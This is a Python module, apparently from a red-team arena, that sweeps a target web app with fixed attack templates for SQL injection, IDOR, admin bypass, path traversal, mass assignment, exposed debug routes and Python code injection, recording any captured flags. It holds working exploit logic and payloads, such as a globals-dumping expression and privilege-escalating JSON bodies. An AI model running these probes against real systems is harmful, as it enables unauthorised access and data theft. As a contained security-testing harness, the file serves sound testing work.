"""Deterministic sweep: run the known-bad templates first, at zero tokens.

The LLM Red agent is still the explore/combine path; this sweep only replays the bug classes
we always test (SQLi, IDOR, admin bypass, path traversal, mass assignment, unauthenticated
debug endpoint, code injection), so a match usually ends before the model is asked to think.
"""
from arena.discover import find_login_path, normalize_route, routes
from arena.httptool import HostLockError, send_request
from arena.payloads import get_payload_templates
from arena.referee import Exploit, find_flags, find_token

ID_RANGE = range(1, 11)
FILE_HINTS = ("file", "path", "name")
DEBUG_HINTS = ("debug", "diagnostic")
CODE_PARAM_HINTS = ("expr", "expression", "eval", "code", "cmd", "command")
MASS_ASSIGN_PAYLOADS = ({"role": "admin"}, {"is_admin": True}, {"admin": True})
CODE_PAYLOADS = ("[v for v in globals().values() if 'FLAG{' in str(v)]",)
REQUEST_BUDGET = 120  # a sweep must never turn into a fuzzer


class Sweep:
    def __init__(self, base_url: str, openapi: dict, users: list, flag_owners: dict | None = None,
                 admin_routes: list | None = None, login_path: str | None = None,
                 loot_paths: list | None = None, emit=None, max_requests: int = REQUEST_BUDGET):
        self.base_url = base_url
        self.routes = routes(openapi)
        self.login_path = find_login_path(openapi, login_path)
        self.users = list(users)
        self.owners = flag_owners or {}
        self.admin_routes = list(admin_routes or [])
        self.loot_paths = list(loot_paths or [])
        self._emit = emit or (lambda event: None)
        self.max_requests = max_requests
        self.requests = 0
        self.findings: dict[str, Exploit] = {}
        self.account = None
        self.token = None
        self.headers: dict = {}
        self.login: dict | None = None

    def run(self) -> list[Exploit]:
        self._login()
        self._sqli()
        self._idor()
        self._admin()
        self._traversal()
        self._mass_assignment()
        self._debug()
        self._code_injection()
        return list(self.findings.values())

    def _login(self):
        if not self.login_path or not self.users:
            return
        self.account = self.users[0]
        body = {"username": self.account["username"], "password": self.account["password"]}
        res = self._send("POST", self.login_path, json=body)
        token = find_token(res.body) if res else None
        if token:
            self.token = token
            self.headers = {"Authorization": f"Bearer {token}"}
            self.login = {"path": self.login_path, "json": body}

    def _send(self, method: str, path: str, *, params: dict | None = None,
              json: dict | None = None, headers: dict | None = None):
        if self.requests >= self.max_requests:
            return None
        self.requests += 1
        args = {"method": method, "path": path}
        if params:
            args["params"] = params
        try:
            res = send_request(method, self.base_url + path, headers=headers or None,
                               params=params, json=json)
        except HostLockError as exc:
            self._emit({"type": "red_error", "tool": "sweep", "error": str(exc)})
            return None
        except Exception as exc:
            self._emit({"type": "red_error", "tool": "sweep", "error": str(exc)})
            return None
        self._emit({"type": "red_action", "tool": "sweep", "source": "sweep",
                    "status": res.status, "args": args})
        return res

    def _record(self, res, vuln_class: str, method: str, path: str, *, params: dict | None = None,
                json: dict | None = None, used_login: bool = False) -> bool:
        """Record any new flag and return True when this request was a breach."""
        hit = False
        if res is None:
            return hit
        for flag in find_flags(res.body):
            if flag in self.findings:
                continue
            owner = self.owners.get(flag)
            if owner and self.account and owner == self.account["username"]:
                continue  # the attacker reading their own data is not a breach
            self.findings[flag] = Exploit(
                method, path, self.headers if used_login else None, params, json, flag,
                vuln_class, self.login if used_login else None)
            packet = {"method": method, "path": path}
            if params:
                packet["params"] = params
            if json:
                packet["json"] = json
            self._emit({"type": "breach", "source": "sweep", "route": normalize_route(path),
                        "vuln_class": vuln_class, "flag": flag, **packet})
            hit = True
        return hit

    def _sqli(self):
        payloads = get_payload_templates("sqli")
        for route in self.routes:
            if route.method != "GET":
                continue
            for param in route.query_params():
                for payload in payloads:
                    params = {param.name: payload}
                    res = self._send("GET", route.path, params=params)
                    if self._record(res, "sqli", "GET", route.path, params=params):
                        break

    def _idor(self):
        if not self.token:
            return
        for route in self.routes:
            path_params = route.path_params()
            if route.method != "GET" or len(path_params) != 1:
                continue
            param = path_params[0]
            if param.type not in ("integer", "int", "number"):
                continue
            for value in ID_RANGE:
                path = route.path.replace("{" + param.name + "}", str(value))
                res = self._send("GET", path, headers=self.headers)
                self._record(res, "idor", "GET", path, used_login=True)

    def _admin(self):
        paths = [r.path for r in self.routes if "admin" in r.path]
        paths += [p for p in self.admin_routes if p not in paths]
        for path in paths:
            if self.token:
                res = self._send("GET", path, headers=self.headers)
                if self._record(res, "admin_bypass", "GET", path, used_login=True):
                    continue
            res = self._send("GET", path)
            self._record(res, "admin_bypass", "GET", path)

    def _traversal(self):
        if not self.loot_paths:
            return
        for route in self.routes:
            if route.method != "GET":
                continue
            for param in route.query_params():
                if not any(hint in param.name.lower() for hint in FILE_HINTS):
                    continue
                for loot in self.loot_paths:
                    for depth in (1, 2, 3):
                        params = {param.name: "../" * depth + loot}
                        res = self._send("GET", route.path, params=params)
                        if self._record(res, "path_traversal", "GET", route.path, params=params):
                            return

    def _mass_assignment(self):
        """A PUT/PATCH body that accepts `role` lets a normal user promote themselves."""
        if not self.token:
            return
        for route in self.routes:
            if route.method not in ("PUT", "PATCH") or "{" in route.path:
                continue
            for payload in MASS_ASSIGN_PAYLOADS:
                res = self._send(route.method, route.path, json=payload, headers=self.headers)
                if self._record(res, "mass_assignment", route.method, route.path,
                                json=payload, used_login=True):
                    break

    def _debug(self):
        """Debug/diagnostic routes that answer without a token leak build secrets."""
        for route in self.routes:
            if route.method != "GET" or "{" in route.path:
                continue
            if not any(hint in route.path.lower() for hint in DEBUG_HINTS):
                continue
            res = self._send("GET", route.path)
            self._record(res, "debug_exposure", "GET", route.path)

    def _code_injection(self):
        """Expression/code parameters evaluated server-side hand over module globals."""
        for route in self.routes:
            if route.method != "GET":
                continue
            for param in route.query_params():
                if param.name.lower() not in CODE_PARAM_HINTS:
                    continue
                for payload in CODE_PAYLOADS:
                    params = {param.name: payload}
                    res = self._send("GET", route.path, params=params)
                    if self._record(res, "code_injection", "GET", route.path, params=params):
                        break


def should_run_llm(strategy: str, findings: list, explore: bool = False) -> bool:
    """Hybrid asks the model only for leftovers (or when --explore forces a pass)."""
    if strategy == "sweep":
        return False
    if strategy == "llm":
        return True
    return explore or not findings
